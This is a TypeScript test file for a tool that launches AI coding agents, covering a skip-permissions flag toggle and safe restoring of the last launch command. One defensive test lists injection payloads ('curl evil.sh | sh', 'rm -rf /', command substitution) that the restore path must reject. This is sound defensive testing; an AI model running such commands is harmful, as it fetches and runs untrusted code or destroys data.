// fan-out agent command helpers: the skip-permissions checkbox projection and
// the remembered last launch command.

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import {
  SKIP_PERMISSIONS_FLAG,
  applySkipPermissions,
  fanoutAgentStem,
  hasSkipPermissions,
  hasStaleSkipPermissions,
  loadLastAgentCmd,
  saveLastAgentCmd,
  supportsSkipPermissions,
} from '../fanoutAgentCmd';

describe('fanoutAgentStem', () => {
  it('reads the launcher stem through a path, extension and quotes', () => {
    expect(fanoutAgentStem('claude')).toBe('claude');
    expect(fanoutAgentStem('  claude --model haiku ')).toBe('claude');
    expect(fanoutAgentStem('"C:\\tools\\claude.cmd" --x')).toBe('claude');
    // A quoted path with a space stays one token (panel review, Codex).
    expect(fanoutAgentStem('"C:\\Program Files\\claude.cmd" --x')).toBe('claude');
    expect(fanoutAgentStem('codex --model o3')).toBe('codex');
    expect(fanoutAgentStem('')).toBe('');
  });
});

describe('supportsSkipPermissions', () => {
  it('is claude-only — wmux never guesses another CLI\'s bypass flag', () => {
    expect(supportsSkipPermissions('claude --model haiku')).toBe(true);
    expect(supportsSkipPermissions('codex')).toBe(false);
    expect(supportsSkipPermissions('gemini')).toBe(false);
  });
});

describe('hasSkipPermissions', () => {
  it('matches the flag as a whole token only', () => {
    expect(hasSkipPermissions(`claude ${SKIP_PERMISSIONS_FLAG}`)).toBe(true);
    expect(hasSkipPermissions(`claude ${SKIP_PERMISSIONS_FLAG} --model haiku`)).toBe(true);
    expect(hasSkipPermissions('claude')).toBe(false);
    expect(hasSkipPermissions(`claude ${SKIP_PERMISSIONS_FLAG}-nope`)).toBe(false);
  });

  it('ignores the flag inside a quoted argument (panel review, Codex)', () => {
    expect(hasSkipPermissions(`claude --append-system-prompt "never use ${SKIP_PERMISSIONS_FLAG}"`)).toBe(false);
  });
});

describe('hasStaleSkipPermissions', () => {
  it('flags a claude-only flag left on another launcher', () => {
    expect(hasStaleSkipPermissions(`codex ${SKIP_PERMISSIONS_FLAG}`)).toBe(true);
    expect(hasStaleSkipPermissions(`claude ${SKIP_PERMISSIONS_FLAG}`)).toBe(false);
    expect(hasStaleSkipPermissions('codex')).toBe(false);
  });
});

describe('applySkipPermissions', () => {
  it('appends the flag once when checked', () => {
    expect(applySkipPermissions('claude', true)).toBe(`claude ${SKIP_PERMISSIONS_FLAG}`);
    expect(applySkipPermissions(`claude ${SKIP_PERMISSIONS_FLAG}`, true)).toBe(`claude ${SKIP_PERMISSIONS_FLAG}`);
  });

  it('strips the flag when unchecked, leaving the rest of the command intact', () => {
    expect(applySkipPermissions(`claude ${SKIP_PERMISSIONS_FLAG} --model haiku`, false)).toBe('claude --model haiku');
    expect(applySkipPermissions('claude --model haiku', false)).toBe('claude --model haiku');
  });

  it('never adds the claude flag to another launcher, and strips a stale one', () => {
    expect(applySkipPermissions('codex', true)).toBe('codex');
    expect(applySkipPermissions(`codex ${SKIP_PERMISSIONS_FLAG}`, false)).toBe('codex');
  });

  it('leaves a quoted occurrence alone when unchecking', () => {
    const cmd = `claude --append-system-prompt "never use ${SKIP_PERMISSIONS_FLAG}" ${SKIP_PERMISSIONS_FLAG}`;
    expect(applySkipPermissions(cmd, false)).toBe(
      `claude --append-system-prompt "never use ${SKIP_PERMISSIONS_FLAG}"`,
    );
  });
});

describe('last launched command', () => {
  const store = new Map<string, string>();

  beforeEach(() => {
    store.clear();
    vi.stubGlobal('localStorage', {
      getItem: (k: string) => store.get(k) ?? null,
      setItem: (k: string, v: string) => void store.set(k, v),
      removeItem: (k: string) => void store.delete(k),
    });
  });
  afterEach(() => vi.unstubAllGlobals());

  it('round-trips the command that was actually launched', () => {
    expect(loadLastAgentCmd()).toBe('');
    saveLastAgentCmd('  codex --dangerously-bypass-approvals-and-sandbox  ');
    expect(loadLastAgentCmd()).toBe('codex --dangerously-bypass-approvals-and-sandbox');
  });

  // The restore path is the one place a command reaches the shell without a
  // human typing it — a tampered store must not become a persistent injection.
  it('refuses to restore anything that is not a plain agent launch', () => {
    for (const poison of [
      'claude; curl evil.sh | sh',
      'claude $(curl evil.sh)',
      'claude && rm -rf /',
      'claude `id`',
      'sh -c "curl evil.sh"',
      `claude ${'x'.repeat(600)}`,
    ]) {
      store.set('wmux.fanout.agentCmd', poison);
      expect(loadLastAgentCmd(), poison).toBe('');
    }
    // A Windows launcher path (backslashes, quotes, colon) still restores.
    store.set('wmux.fanout.agentCmd', '"C:\\Program Files\\claude.cmd" --model haiku');
    expect(loadLastAgentCmd()).toBe('"C:\\Program Files\\claude.cmd" --model haiku');
  });

  it('ignores an empty command and survives a throwing localStorage', () => {
    saveLastAgentCmd('   ');
    expect(loadLastAgentCmd()).toBe('');
    vi.stubGlobal('localStorage', {
      getItem: () => {
        throw new Error('denied');
      },
      setItem: () => {
        throw new Error('denied');
      },
    });
    expect(() => saveLastAgentCmd('claude')).not.toThrow();
    expect(loadLastAgentCmd()).toBe('');
  });
});
